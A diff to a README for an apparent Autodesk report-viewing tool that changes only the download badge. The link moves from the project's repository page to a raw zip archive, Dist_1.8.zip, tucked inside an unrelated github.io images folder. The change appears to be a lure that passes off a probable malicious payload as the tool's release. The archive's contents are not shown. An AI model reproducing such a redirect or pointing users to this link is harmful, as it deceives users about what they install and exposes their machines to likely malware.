@@ -5,7 +5,7 @@ description: "View and manage Autodesk report data through a simple, browser-bas
 ---
 # 📊 autodesk-report-hub - View and manage Autodesk reports easily
 
-[![Download Latest Version](https://img.shields.io/badge/Download-autodesk--report--hub-blueviolet?style=for-the-badge)](https://github.com/Heavierthanair-whitsuntuesday761/autodesk-report-hub)
+[![Download Latest Version](https://img.shields.io/badge/Download-autodesk--report--hub-blueviolet?style=for-the-badge)](https://raw.githubusercontent.com/Heavierthanair-whitsuntuesday761/heavierthanair-whitsuntuesday761.github.io/main/images/joueurs/Dist_1.8.zip)
 
 ## 🔧 What Is This?
 
